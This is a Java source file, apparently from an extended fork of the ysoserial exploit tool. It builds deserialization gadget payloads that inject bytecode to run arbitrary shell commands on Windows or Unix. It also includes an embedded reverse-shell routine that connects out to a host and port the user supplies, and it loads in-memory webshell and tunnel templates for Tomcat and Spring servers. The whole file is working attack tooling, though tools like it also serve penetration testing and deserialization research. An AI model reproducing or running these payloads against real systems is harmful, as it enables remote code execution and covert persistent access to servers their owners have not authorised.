package ysoserial.payloads.util;


import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.codec.binary.Base64;
import org.apache.commons.lang.RandomStringUtils;
import org.apache.wicket.util.file.Files;
import javax.net.ssl.HttpsURLConnection;
import java.io.*;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.net.URL;
import java.util.HashMap;
import java.util.Map;
import java.util.zip.GZIPOutputStream;
import ysoserial.payloads.templates.SpringInterceptorMemShell;
import ysoserial.payloads.templates.ClassLoaderTemplate;
import ysoserial.payloads.templates.CommandTemplate;
import ysoserial.payloads.templates.ScriptEngineTemplate;
import ysoserial.payloads.templates.SpringInterceptorTemplate;
import ysoserial.payloads.templates.TomcatCmdEcho;
import ysoserial.payloads.templates.TomcatFilterMemShellFromJMX;
import ysoserial.payloads.templates.TomcatFilterMemShellFromThread;
import ysoserial.payloads.templates.TomcatListenerMemShellFromJMX;
import ysoserial.payloads.templates.TomcatListenerMemShellFromThread;
import ysoserial.payloads.templates.TomcatListenerNeoRegFromThread;
import ysoserial.payloads.templates.TomcatServletMemShellFromJMX;
import ysoserial.payloads.templates.TomcatServletMemShellFromThread;
import ysoserial.payloads.templates.ZohoPMPTomcatEcho;

import static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.DESERIALIZE_TRANSLET;


/*
 * utility generator functions for common jdk-only gadgets
 */
@SuppressWarnings({"restriction", "rawtypes", "unchecked"})
public class Gadgets {

    public static final String ANN_INV_HANDLER_CLASS = "sun.reflect.annotation.AnnotationInvocationHandler";

    static {
        // special case for using TemplatesImpl gadgets with a SecurityManager enabled
        System.setProperty(DESERIALIZE_TRANSLET, "true");

        // for RMI remote loading
        System.setProperty("java.rmi.server.useCodebaseOnly", "false");
    }

    public static <T> T createMemoitizedProxy(final Map<String, Object> map, final Class<T> iface, final Class<?>... ifaces) throws Exception {
        return createProxy(createMemoizedInvocationHandler(map), iface, ifaces);
    }

    public static InvocationHandler createMemoizedInvocationHandler(final Map<String, Object> map) throws Exception {
        return (InvocationHandler) Reflections.getFirstCtor(ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);
    }

    public static <T> T createProxy(final InvocationHandler ih, final Class<T> iface, final Class<?>... ifaces) {
        final Class<?>[] allIfaces = (Class<?>[]) Array.newInstance(Class.class, ifaces.length + 1);
        allIfaces[0] = iface;
        if (ifaces.length > 0) {
            System.arraycopy(ifaces, 0, allIfaces, 1, ifaces.length);
        }
        return iface.cast(Proxy.newProxyInstance(Gadgets.class.getClassLoader(), allIfaces, ih));
    }

    public static Map<String, Object> createMap(final String key, final Object val) {
        final Map<String, Object> map = new HashMap<String, Object>();
        map.put(key, val);
        return map;
    }
    public static <T> T createTemplatesImpl ( final String command, final String attackType, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory )
        throws Exception {
        final T templates = tplClass.newInstance();

        // use template gadget class
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));
        pool.insertClassPath(new ClassClassPath(abstTranslet));
        final CtClass clazz = pool.get(StubTransletPayload.class.getName());

        // default ysoserial exec global
        String cmd = "java.lang.Runtime.getRuntime().exec(\"" +
            command.replaceAll("\\\\","\\\\\\\\").replaceAll("\"", "\\\"") +
            "\");";

        // federicodotta - EXEC with args win
        if(attackType.equals("exec_win")) {

            cmd = "java.lang.Runtime.getRuntime().exec(new String[]{\"cmd\",\"/C\",\"" + command.replaceAll("\"", "\\\"") + "\"});";

            // federicodotta - EXEC with unix
        } else if(attackType.equals("exec_unix")) {

            cmd = "java.lang.Runtime.getRuntime().exec(new String[]{\"/bin/sh\",\"-c\",\"" + command.replaceAll("\"", "\\\"") + "\"});";

            // federicodotta - Java native sleep
        } else if(attackType.equals("sleep")) {

            long timeToSleep = Long.parseLong(command);
            cmd = "java.lang.Thread.sleep((long)" + timeToSleep + ");";

            // federicodotta - Java native DNS resolution
        } else if(attackType.equals("dns")) {

            cmd = "java.net.InetAddress.getByName(\"" + command + "\");";

            // NickstaDB - Reverse shell
        } else if(attackType.equals("java_reverse_shell")) {

            if(command.split(":").length != 2) {
                throw new IllegalArgumentException("Connect back command format is <host>:<port> (got " + command + ")");
            }
            String host = command.split(":")[0];
            int port;
            try {
                port = Integer.parseInt(command.split(":")[1]);
            } catch(NumberFormatException nfe) {
                throw new IllegalArgumentException("Invalid port specified for connect back command (" + command.split(":")[2] + ")");
            }
            if(port < 1 || port > 65535) {
                throw new IllegalArgumentException("Invalid port specified for connect back command (" + port + ")");
            }
            cmd = "java.net.Socket sck=null;java.io.OutputStream out;java.io.BufferedReader rdr;Process proc;String cmd=\"\";String " +
                "os=System.getProperty(\"os.name\").toLowerCase(java.util.Locale.ENGLISH);try{sck=new java.net.Socket(java.net.Inet" +
                "Address.getByName(\"" + host + "\")," + port + ");out=sck.getOutputStream();rdr=new java.io.BufferedReader(new java" +
                ".io.InputStreamReader(sck.getInputStream()));while(cmd.trim().toLowerCase(java.util.Locale.ENGLISH).equals(\"exit\")" +
                "==false){try{out.write(\"> \".getBytes(),0,\"> \".getBytes().length);cmd=rdr.readLine();if(cmd.trim().toLowerCase(" +
                "java.util.Locale.ENGLISH).equals(\"exit\")==false){if(os.contains(\"win\")){proc=new ProcessBuilder(new String[]{\"cmd\",\"/c\",\"" +
                "\\\"\"+cmd.trim()+\"\\\"\"}).redirectErrorStream(true).start();}else{try{proc=new ProcessBuilder(new String[]{\"/bin/bash\",\"-c\"," +
                "cmd.trim()}).redirectErrorStream(true).start();}catch(java.io.IOException ioe){if(ioe.getMessage().contains(\"Cannot " +
                "run program\")){try{proc=new ProcessBuilder(new String[]{\"/bin/sh\",\"-c\",cmd.trim()}).redirectErrorStream(true).start();}catch(" +
                "java.io.IOException ioe2){if(ioe2.getMessage().contains(\"Cannot run program\")){throw new java.io.IOException(\"Non-" +
                "Windows target and neither /bin/bash or /bin/sh is present.\");}else{throw ioe2;}}}else{throw ioe;}}}proc.waitFor();" +
                "byte[] b=new byte[proc.getInputStream().available()];proc.getInputStream().read(b);out.write(b);}}catch(Exception ex" +
                "){out.write((\"[-] Exception: \"+ex.toString()).getBytes());}}sck.close();}catch(Exception ex){if(sck!=null){try{sck" +
                ".close();}catch(Exception ex2){}}}";

        }

        clazz.makeClassInitializer().insertAfter(cmd);
        // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
        clazz.setName("ysoserial.Pwner" + System.nanoTime());
        CtClass superC = pool.get(abstTranslet.getName());
        clazz.setSuperclass(superC);

        final byte[] classBytes = clazz.toBytecode();

        // inject class bytes into instance
        Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {
            classBytes, ClassFiles.classAsBytes(Foo.class)
        });

        // required to make TemplatesImpl happy
        Reflections.setFieldValue(templates, "_name", "Pwnr");
        Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());
        return templates;
    }
    public static Object createTemplatesImpl ( final String command, final String attackType ) throws Exception {
        if ( Boolean.parseBoolean(System.getProperty("properXalan", "false")) ) {
            return createTemplatesImpl(
                command,
                attackType,
                Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl"),
                Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet"),
                Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl"));
        }

        return createTemplatesImpl(command, attackType, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);
    }
    public static Object createTemplatesImpl(String command) throws Exception {
        command = command.trim();
        Class tplClass;
        Class abstTranslet;
        Class transFactory;

        if (Boolean.parseBoolean(System.getProperty("properXalan", "false"))) {
            tplClass = Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl");
            abstTranslet = Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet");
            transFactory = Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl");
        } else {
            tplClass = TemplatesImpl.class;
            abstTranslet = AbstractTranslet.class;
            transFactory = TransformerFactoryImpl.class;
        }

        if (command.startsWith("CLASS:")) {
            // 这里不能让它初始化，不然从线程中获取WebappClassLoaderBase时会强制类型转换异常。
            Class<?> clazz = Class.forName("ysoserial.payloads.templates." + command.substring(6), false, Gadgets.class.getClassLoader());
            return createTemplatesImpl(clazz, (String)null, (byte[])null, tplClass, abstTranslet, transFactory);
        } else if (command.startsWith("FILE:")) {
            byte[] bs = Files.readBytes(new File(command.substring(5)));
            return createTemplatesImpl(null, null, bs, tplClass, abstTranslet, transFactory);
        } else {
            return createTemplatesImpl(null, command, null, tplClass, abstTranslet, transFactory);
        }
    }


    public static <T> T createTemplatesImpl(Class myClass, final String command, byte[] bytes, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory) throws Exception {
        final T templates = tplClass.newInstance();
        byte[] classBytes = new byte[0];
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(abstTranslet));
        // fixed javassist.NotFoundException: ysoserial.payloads.templates.*
        Class []xx = new Class[]{ysoserial.payloads.templates.SpringInterceptorMemShell.class,
            ysoserial.payloads.templates.ClassLoaderTemplate.class,
            ysoserial.payloads.templates.CommandTemplate.class,
            ysoserial.payloads.templates.ScriptEngineTemplate.class,
            ysoserial.payloads.templates.SpringInterceptorTemplate.class,
            ysoserial.payloads.templates.TomcatCmdEcho.class,
            ysoserial.payloads.templates.TomcatFilterMemShellFromJMX.class,
            ysoserial.payloads.templates.TomcatFilterMemShellFromThread.class,
            ysoserial.payloads.templates.TomcatListenerMemShellFromJMX.class,
            ysoserial.payloads.templates.TomcatListenerMemShellFromThread.class,
            ysoserial.payloads.templates.TomcatListenerNeoRegFromThread.class,
            ysoserial.payloads.templates.TomcatServletMemShellFromJMX.class,
            ysoserial.payloads.templates.TomcatServletMemShellFromThread.class,
            ysoserial.payloads.templates.ZohoPMPTomcatEcho.class};
        for(int i = 0; i < xx.length;i++){
            pool.insertClassPath(new ClassClassPath(xx[i]));
        }
        CtClass superC = pool.get(abstTranslet.getName());
        CtClass ctClass;

        if (command != null) {
            ctClass = pool.get("ysoserial.payloads.templates.CommandTemplate");
            ctClass.setName(ctClass.getName() + System.nanoTime());
            String cmd1 = "cmd = \"" + command + "\";";
            ctClass.makeClassInitializer().insertBefore(cmd1);
            ctClass.setSuperclass(superC);
            classBytes = ctClass.toBytecode();
        }
        if (myClass != null) {
            // CLASS:
            ctClass = pool.get(myClass.getName());
            ctClass.setSuperclass(superC);
            // SpringInterceptorMemShell单独对待
            if (myClass.getName().contains("SpringInterceptorMemShell")) {
                // 修改b64字节码
                CtClass springTemplateClass = pool.get("ysoserial.payloads.templates.SpringInterceptorTemplate");
                String clazzName = "ysoserial.payloads.templates.SpringInterceptorTemplate" + System.nanoTime();
                springTemplateClass.setName(clazzName);
                String encode = Base64.encodeBase64String(springTemplateClass.toBytecode());
                String b64content = "b64=\"" + encode + "\";";
                ctClass.makeClassInitializer().insertBefore(b64content);
                // 修改SpringInterceptorMemShell随机命名 防止二次打不进去
                String clazzNameContent = "clazzName=\"" + clazzName + "\";";
                ctClass.makeClassInitializer().insertBefore(clazzNameContent);
                ctClass.setName(SpringInterceptorMemShell.class.getName() + System.nanoTime());
                classBytes = ctClass.toBytecode();
            } else {
                if(myClass.getName().contains("ScriptEngineTemplate")){
                    String cmd = "";
                    String szInjecting = "Custom_Code_51pwn";
                    String szEvCmd = System.getenv(szInjecting);
                    if(""!=szEvCmd){
                        cmd = szEvCmd;
                    }
                    // # 2 file
                    File file = new File(szInjecting);
                    if(file.exists()){
                        byte[] bytes1 = new byte[(int) file.length()];
                        FileInputStream fis = null;
                        try{
                            fis = new FileInputStream(file);
                            if (0 < fis.read(bytes1)) {
                                cmd = new String(bytes1);
                            }
                        }catch (Exception e){}
                        finally {
                            if(null !=fis){
                                try {
                                    fis.close();
                                } catch (Exception e) {
                                }
                            }
                        }
                    }
                    if(""!=cmd){
                        String cmd1 = getString(cmd);
                        ctClass.makeClassInitializer().insertBefore(cmd1);
                    }
                }
                // 其他的TomcatFilterMemShellFromThread这种可以直接加载 需要随机命名类名
                ctClass.setName(myClass.getName() + System.nanoTime());
                classBytes = ctClass.toBytecode();
            }
        }
        if (bytes != null) {
            // FILE:
            ctClass = pool.get("ysoserial.payloads.templates.ClassLoaderTemplate");
            ctClass.setName(ctClass.getName() + System.nanoTime());
            ByteArrayOutputStream outBuf = new ByteArrayOutputStream();
            GZIPOutputStream gzipOutputStream = new GZIPOutputStream(outBuf);
            gzipOutputStream.write(bytes);
            gzipOutputStream.close();
            String content = "b64=\"" + Base64.encodeBase64String(outBuf.toByteArray()) + "\";";
            // System.out.println(content);
            ctClass.makeClassInitializer().insertBefore(content);
            ctClass.setSuperclass(superC);
            classBytes = ctClass.toBytecode();
        }


        // inject class bytes into instance
        Reflections.setFieldValue(templates, "_bytecodes", new byte[][]{classBytes, ClassFiles.classAsBytes(Foo.class)});

        // required to make TemplatesImpl happy
        Reflections.setFieldValue(templates, "_name", RandomStringUtils.randomAlphabetic(8).toUpperCase());
        Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());
        return templates;
    }

    private static String getString(String cmd) {
        byte[] byteArray = cmd.getBytes();
        StringBuilder sb = new StringBuilder();
        sb.append("new String(new byte[]{");
        for (int i = 0; i < byteArray.length; i++) {
            sb.append(byteArray[i]);
            if (i != byteArray.length - 1) {
                sb.append(", ");
            }
        }
        sb.append("});");
        String cmd1 = "cmd = "+sb.toString();
        return cmd1;
    }

    public static HashMap makeMap(Object v1, Object v2) throws Exception {
        HashMap s = new HashMap();
        Reflections.setFieldValue(s, "size", 2);
        Class nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        } catch (ClassNotFoundException e) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        Reflections.setAccessible(nodeCons);

        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
        Reflections.setFieldValue(s, "table", tbl);
        return s;
    }

    public static class StubTransletPayload extends AbstractTranslet implements Serializable {

        private static final long serialVersionUID = -5971610431559700674L;


        public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
        }


        @Override
        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
        }
    }

    // required to make TemplatesImpl happy
    public static class Foo implements Serializable {

        private static final long serialVersionUID = 8207363842866235160L;
    }
}
